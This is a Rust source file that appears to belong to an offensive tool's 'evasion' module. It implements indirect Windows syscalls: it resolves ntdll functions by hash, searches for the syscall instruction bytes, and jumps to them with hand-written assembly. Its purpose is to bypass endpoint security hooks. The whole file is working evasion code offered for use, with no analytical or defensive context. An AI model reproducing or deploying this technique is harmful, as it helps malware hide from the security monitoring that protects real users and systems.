use crate::techniques::evasion::dinamic_api_resolution::{get_export_by_name_hash, get_ntdll_base};

pub unsafe fn indirect_syscall_6(
    api_hash: u32,
    sys_number: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
) -> Result<i32, String> {
    let mut status: i32;
    use std::arch::asm;
    let address = unsafe { get_export_by_name_hash(get_ntdll_base(), api_hash) };
    match address {
        Ok(address) => address,
        Err(_) => return Err(String::from("Api not found")),
    };
    let syscall_address = unsafe { find_syscall_address(address.unwrap()) };
    match syscall_address {
        Some(address) => address,
        None => return Err(String::from("Syscall not found on api")),
    };
    #[cfg(debug_assertions)]
    println!(
        "Calling syscall with address: {:#x}",
        syscall_address.unwrap()
    );

    unsafe {
        asm!(
            "mov [rsp + 0x20], {a5_reg}",
            "mov [rsp + 0x28], {a6_reg}",
            "mov r10, rcx",
            "mov eax, edi",
            "call rsi",

            in("edi") sys_number,
            in("rcx") a1,        
            in("rdx") a2,        
            in("r8")  a3,        
            in("r9")  a4,        
            in("rsi") syscall_address.unwrap(), 
            a5_reg = in(reg) a5,
            a6_reg = in(reg) a6,
            lateout("eax") status,
            clobber_abi("win64"));
    }
    Result::Ok(status)
}

unsafe fn find_syscall_address(function_address: *const u8) -> Option<usize> {
    let mut ptr = function_address;

    for _ in 0..64 {
        unsafe {
            if *ptr == 0x0F && *ptr.add(1) == 0x05 && *ptr.add(2) == 0xC3 {
                let syscall_absolute_address = ptr as usize;
                #[cfg(debug_assertions)]
                println!("Syscall found at address: {:#x}", syscall_absolute_address);
                return Some(syscall_absolute_address);
            }
            ptr = ptr.add(1);
        }
    }
    None
}
